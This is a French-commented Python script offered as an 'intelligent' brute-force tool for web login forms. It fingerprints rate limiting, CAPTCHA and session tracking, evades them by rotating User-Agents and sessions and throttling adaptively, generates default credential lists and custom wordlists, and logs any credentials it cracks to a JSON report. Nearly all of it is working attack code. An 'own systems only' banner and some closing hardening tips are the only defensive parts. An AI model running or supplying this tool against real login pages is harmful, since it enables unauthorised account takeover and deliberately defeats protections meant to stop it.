#!/usr/bin/env python3
"""
Outil de brute force intelligent avec détection d'anti-brute force
et techniques d'évasion
UTILISER UNIQUEMENT SUR VOS PROPRES SYSTÈMES !
"""

import requests
import time
import random
import json
from concurrent.futures import ThreadPoolExecutor
import threading
from collections import defaultdict
from datetime import datetime, timedelta
import re
from urllib.parse import urljoin
from bs4 import BeautifulSoup
import base64
import hashlib

class IntelligentBruteForcer:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.verify = False
        
        # Statistiques
        self.stats = {
            'attempts': 0,
            'successes': 0,
            'failures': 0,
            'errors': 0,
            'rate_limits': 0,
            'captchas': 0
        }
        
        # Configuration adaptative
        self.config = {
            'initial_delay': 0.5,
            'current_delay': 0.5,
            'max_delay': 30,
            'threads': 5,
            'user_agents': [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
            ],
            'use_proxies': False,
            'proxy_list': []
        }
        
        # Détection des mécanismes anti-brute force
        self.anti_brute_force = {
            'rate_limiting': False,
            'captcha': False,
            'account_lockout': False,
            'ip_blocking': False,
            'session_tracking': False,
            'delay_patterns': []
        }
        
        # Cache des réponses pour l'apprentissage
        self.response_cache = defaultdict(list)
        self.lock = threading.Lock()
    
    def analyze_target(self, login_url):
        """Analyse la cible pour détecter les mécanismes de protection"""
        print("[*] Analyse de la cible...")
        
        # Test de base
        test_credentials = [
            ('test', 'test'),
            ('admin', 'wrongpass'),
            ('user', '12345')
        ]
        
        responses = []
        for username, password in test_credentials:
            try:
                start_time = time.time()
                response = self._attempt_login(login_url, username, password)
                elapsed = time.time() - start_time
                
                responses.append({
                    'status': response.status_code,
                    'length': len(response.text),
                    'time': elapsed,
                    'headers': dict(response.headers),
                    'text': response.text[:500]
                })
                
                time.sleep(0.5)
                
            except Exception as e:
                pass
        
        # Analyser les patterns
        self._detect_protection_mechanisms(responses)
        
        print(f"[*] Mécanismes détectés:")
        for mechanism, detected in self.anti_brute_force.items():
            if detected:
                print(f"    - {mechanism}: {detected}")
    
    def _detect_protection_mechanisms(self, responses):
        """Détecte les mécanismes de protection anti-brute force"""
        if not responses:
            return
        
        # Détection du rate limiting
        rate_limit_indicators = ['rate limit', 'too many requests', '429']
        for resp in responses:
            if any(ind in str(resp).lower() for ind in rate_limit_indicators):
                self.anti_brute_force['rate_limiting'] = True
        
        # Détection de CAPTCHA
        captcha_indicators = ['captcha', 'recaptcha', 'challenge', 'verify human']
        for resp in responses:
            if any(ind in resp.get('text', '').lower() for ind in captcha_indicators):
                self.anti_brute_force['captcha'] = True
        
        # Détection des délais progressifs
        times = [r['time'] for r in responses]
        if len(times) > 2 and times[-1] > times[0] * 2:
            self.anti_brute_force['delay_patterns'] = times
        
        # Détection du tracking de session
        session_headers = ['X-RateLimit', 'X-Session-ID', 'CF-RAY']
        for resp in responses:
            if any(h in resp.get('headers', {}) for h in session_headers):
                self.anti_brute_force['session_tracking'] = True
    
    def smart_brute_force(self, login_url, wordlist_file=None, max_attempts=1000):
        """
        Brute force intelligent avec adaptation automatique
        """
        print(f"\n[*] Démarrage du brute force intelligent sur {login_url}")
        print(f"[*] Configuration adaptative activée")
        
        # Analyser la cible d'abord
        self.analyze_target(login_url)
        
        # Charger ou générer la wordlist
        credentials = self._load_credentials(wordlist_file)
        
        # Ajuster la configuration selon les protections détectées
        self._adjust_configuration()
        
        # Lancer le brute force
        successful_logins = []
        
        with ThreadPoolExecutor(max_workers=self.config['threads']) as executor:
            futures = []
            
            for i, (username, password) in enumerate(credentials[:max_attempts]):
                # Adaptation dynamique
                if i % 10 == 0:
                    self._adapt_strategy()
                
                future = executor.submit(
                    self._intelligent_attempt,
                    login_url,
                    username,
                    password,
                    i
                )
                futures.append((future, username, password))
                
                # Délai adaptatif entre les soumissions
                time.sleep(self.config['current_delay'])
            
            # Récupérer les résultats
            for future, username, password in futures:
                try:
                    success = future.result(timeout=30)
                    if success:
                        successful_logins.append((username, password))
                        print(f"\n[+] LOGIN RÉUSSI: {username}:{password}")
                except Exception as e:
                    self.stats['errors'] += 1
        
        # Rapport final
        self._generate_report(successful_logins)
        
        return successful_logins
    
    def _load_credentials(self, wordlist_file):
        """Charge ou génère une liste de credentials intelligente"""
        credentials = []
        
        # Mots de passe communs par catégorie
        common_passwords = {
            'simple': ['123456', 'password', '12345678', 'qwerty', 'abc123'],
            'admin': ['admin', 'administrator', 'root', 'toor', 'admin123'],
            'seasons': ['summer2024', 'winter2024', 'spring2024', 'fall2024'],
            'company': ['welcome', 'changeme', 'default', 'guest', 'temp123'],
            'complex': ['P@ssw0rd', 'Admin@123', 'Welcome123!', 'Password1!']
        }
        
        # Noms d'utilisateur communs
        common_usernames = [
            'admin', 'administrator', 'root', 'user', 'test',
            'demo', 'guest', 'oracle', 'postgres', 'web'
        ]
        
        if wordlist_file:
            try:
                with open(wordlist_file, 'r') as f:
                    lines = f.readlines()
                    for line in lines:
                        if ':' in line:
                            user, passwd = line.strip().split(':', 1)
                            credentials.append((user, passwd))
                        else:
                            # Si pas de format user:pass, utiliser comme mot de passe
                            for user in common_usernames:
                                credentials.append((user, line.strip()))
            except:
                print("[!] Erreur lecture wordlist, utilisation des valeurs par défaut")
        
        # Ajouter les credentials par défaut
        for user in common_usernames:
            for category, passwords in common_passwords.items():
                for passwd in passwords:
                    credentials.append((user, passwd))
        
        # Mélanger pour éviter les patterns prévisibles
        random.shuffle(credentials)
        
        return credentials
    
    def _adjust_configuration(self):
        """Ajuste la configuration selon les protections détectées"""
        if self.anti_brute_force['rate_limiting']:
            print("[*] Rate limiting détecté - Réduction du nombre de threads")
            self.config['threads'] = 2
            self.config['current_delay'] = 2.0
        
        if self.anti_brute_force['session_tracking']:
            print("[*] Session tracking détecté - Rotation des sessions activée")
            self.config['rotate_sessions'] = True
        
        if self.anti_brute_force['captcha']:
            print("[!] CAPTCHA détecté - Le brute force sera probablement inefficace")
            self.config['threads'] = 1
            self.config['current_delay'] = 5.0
    
    def _adapt_strategy(self):
        """Adapte la stratégie en temps réel"""
        with self.lock:
            # Calculer le taux d'erreur
            total = self.stats['attempts']
            if total > 0:
                error_rate = self.stats['errors'] / total
                rate_limit_rate = self.stats['rate_limits'] / total
                
                # Ajuster le délai
                if rate_limit_rate > 0.1:  # Plus de 10% de rate limits
                    self.config['current_delay'] = min(
                        self.config['current_delay'] * 1.5,
                        self.config['max_delay']
                    )
                    print(f"[*] Augmentation du délai à {self.config['current_delay']:.1f}s")
                elif error_rate < 0.05:  # Moins de 5% d'erreurs
                    self.config['current_delay'] = max(
                        self.config['current_delay'] * 0.9,
                        self.config['initial_delay']
                    )
    
    def _intelligent_attempt(self, login_url, username, password, attempt_num):
        """Tentative de login intelligente avec techniques d'évasion"""
        try:
            # Rotation de User-Agent
            headers = {
                'User-Agent': random.choice(self.config['user_agents']),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'DNT': '1',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1'
            }
            
            # Créer une nouvelle session périodiquement
            if attempt_num % 20 == 0 and self.config.get('rotate_sessions'):
                self.session = requests.Session()
                self.session.verify = False
            
            # Tentative de login
            response = self._attempt_login(login_url, username, password, headers)
            
            # Analyser la réponse
            success = self._analyze_response(response, username)
            
            # Mettre à jour les stats
            with self.lock:
                self.stats['attempts'] += 1
                if success:
                    self.stats['successes'] += 1
                else:
                    self.stats['failures'] += 1
                
                # Détecter rate limiting
                if response.status_code == 429 or 'rate' in response.text.lower():
                    self.stats['rate_limits'] += 1
                
                # Détecter CAPTCHA
                if 'captcha' in response.text.lower():
                    self.stats['captchas'] += 1
            
            # Afficher la progression
            if self.stats['attempts'] % 25 == 0:
                print(f"[*] Progression: {self.stats['attempts']} tentatives, "
                      f"{self.stats['successes']} succès, "
                      f"{self.stats['rate_limits']} rate limits")
            
            return success
            
        except Exception as e:
            with self.lock:
                self.stats['errors'] += 1
            return False
    
    def _attempt_login(self, login_url, username, password, headers=None):
        """Effectue une tentative de login"""
        # Détecter le type de formulaire
        login_page = self.session.get(login_url, headers=headers)
        soup = BeautifulSoup(login_page.text, 'html.parser')
        
        # Trouver le formulaire
        form = soup.find('form')
        if not form:
            # Essayer une API JSON
            data = {'username': username, 'password': password}
            return self.session.post(login_url, json=data, headers=headers)
        
        # Extraire les champs du formulaire
        data = {}
        for input_tag in form.find_all('input'):
            name = input_tag.get('name')
            if not name:
                continue
            
            if input_tag.get('type') == 'password':
                data[name] = password
            elif 'user' in name.lower() or 'email' in name.lower() or 'login' in name.lower():
                data[name] = username
            elif input_tag.get('value'):
                # Conserver les valeurs par défaut (tokens CSRF, etc.)
                data[name] = input_tag.get('value')
        
        # Si pas de champ username trouvé, essayer les noms communs
        if not any('user' in k.lower() or 'email' in k.lower() for k in data.keys()):
            data['username'] = username
        
        # Déterminer l'URL d'action
        action = form.get('action', login_url)
        if not action.startswith('http'):
            action = urljoin(login_url, action)
        
        # Envoyer la requête
        method = form.get('method', 'post').lower()
        if method == 'post':
            return self.session.post(action, data=data, headers=headers, allow_redirects=True)
        else:
            return self.session.get(action, params=data, headers=headers, allow_redirects=True)
    
    def _analyze_response(self, response, username):
        """Analyse intelligente de la réponse pour déterminer le succès"""
        # Indicateurs de succès
        success_indicators = [
            'dashboard', 'welcome', 'logout', 'profile', 'account',
            'success', 'mon compte', 'déconnexion', username.lower()
        ]
        
        # Indicateurs d'échec
        failure_indicators = [
            'invalid', 'incorrect', 'failed', 'error', 'denied',
            'wrong', 'bad', 'invalide', 'incorrect', 'erreur'
        ]
        
        text_lower = response.text.lower()
        url_lower = response.url.lower()
        
        # Vérifications basiques
        if response.status_code >= 400:
            return False
        
        # Analyse du contenu
        success_score = sum(1 for ind in success_indicators if ind in text_lower or ind in url_lower)
        failure_score = sum(1 for ind in failure_indicators if ind in text_lower)
        
        # Vérifier les redirections
        if len(response.history) > 0:
            # Une redirection après login est souvent bon signe
            final_url = response.url.lower()
            if 'login' not in final_url and any(ind in final_url for ind in ['dashboard', 'home', 'panel']):
                success_score += 2
        
        # Décision finale
        return success_score > failure_score and success_score > 0
    
    def _generate_report(self, successful_logins):
        """Génère un rapport détaillé du brute force"""
        print("\n" + "="*60)
        print("RAPPORT DE BRUTE FORCE INTELLIGENT")
        print("="*60)
        
        print(f"\nCible: {self.target_url}")
        print(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        
        print("\n[*] Statistiques:")
        for key, value in self.stats.items():
            print(f"    - {key}: {value}")
        
        print("\n[*] Protections détectées:")
        for mechanism, detected in self.anti_brute_force.items():
            if detected:
                print(f"    - {mechanism}: {detected}")
        
        if successful_logins:
            print(f"\n[+] {len(successful_logins)} CREDENTIAL(S) TROUVÉ(S):")
            for username, password in successful_logins:
                print(f"    - {username}:{password}")
        else:
            print("\n[-] Aucun credential trouvé")
        
        # Recommandations
        print("\n[*] Recommandations de sécurité:")
        if not self.anti_brute_force['rate_limiting']:
            print("    - Implémenter un rate limiting")
        if not self.anti_brute_force['account_lockout']:
            print("    - Implémenter un verrouillage de compte après X tentatives")
        if not self.anti_brute_force['captcha']:
            print("    - Ajouter un CAPTCHA après plusieurs échecs")
        print("    - Utiliser des mots de passe forts (12+ caractères)")
        print("    - Activer l'authentification à deux facteurs")
        print("    - Logger et monitorer les tentatives de connexion")
        
        # Sauvegarder le rapport
        report = {
            'target': self.target_url,
            'date': datetime.now().isoformat(),
            'stats': self.stats,
            'protections': self.anti_brute_force,
            'successful_logins': successful_logins
        }
        
        filename = f"bruteforce_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w') as f:
            json.dump(report, f, indent=4)
        
        print(f"\n[*] Rapport sauvegardé: {filename}")


# Fonction utilitaire pour générer des wordlists personnalisées
def generate_custom_wordlist(output_file, patterns=None):
    """Génère une wordlist personnalisée basée sur des patterns"""
    if patterns is None:
        patterns = {
            'base_words': ['admin', 'password', 'login', 'test', 'demo'],
            'years': range(2020, 2025),
            'special_chars': ['!', '@', '#', '$', '*'],
            'numbers': range(0, 100)
        }
    
    wordlist = set()
    
    # Générer des variations
    for base in patterns['base_words']:
        wordlist.add(base)
        wordlist.add(base.capitalize())
        wordlist.add(base.upper())
        
        # Avec années
        for year in patterns['years']:
            wordlist.add(f"{base}{year}")
            wordlist.add(f"{base.capitalize()}{year}")
        
        # Avec chiffres
        for num in patterns['numbers']:
            wordlist.add(f"{base}{num}")
            if num < 10:
                wordlist.add(f"{base}0{num}")
        
        # Avec caractères spéciaux
        for char in patterns['special_chars']:
            wordlist.add(f"{base}{char}")
            wordlist.add(f"{char}{base}")
            wordlist.add(f"{base.capitalize()}{char}")
    
    # Sauvegarder
    with open(output_file, 'w') as f:
        for word in sorted(wordlist):
            f.write(f"admin:{word}\n")
            f.write(f"root:{word}\n")
            f.write(f"user:{word}\n")
    
    print(f"[*] Wordlist générée: {output_file} ({len(wordlist)*3} entrées)")


if __name__ == "__main__":
    print("╔══════════════════════════════════════════════════╗")
    print("║     Outil de Brute Force Intelligent v2.0        ║")
    print("╠══════════════════════════════════════════════════╣")
    print("║  ⚠️  UTILISER UNIQUEMENT SUR VOS SYSTÈMES !      ║")
    print("╚══════════════════════════════════════════════════╝")
    
    import sys
    
    # Menu principal
    print("\n1. Brute force intelligent")
    print("2. Générer une wordlist personnalisée")
    print("3. Analyser les protections d'une cible")
    
    choice = input("\nVotre choix: ")
    
    if choice == '1':
        target = input("URL de login cible: ")
        wordlist = input("Fichier wordlist (laisser vide pour défaut): ").strip()
        max_attempts = int(input("Nombre max de tentatives (défaut: 1000): ") or "1000")
        
        bruteforcer = IntelligentBruteForcer(target)
        bruteforcer.smart_brute_force(target, wordlist or None, max_attempts)
        
    elif choice == '2':
        output = input("Nom du fichier de sortie: ")
        generate_custom_wordlist(output)
        
    elif choice == '3':
        target = input("URL de login à analyser: ")
        bruteforcer = IntelligentBruteForcer(target)
        bruteforcer.analyze_target(target)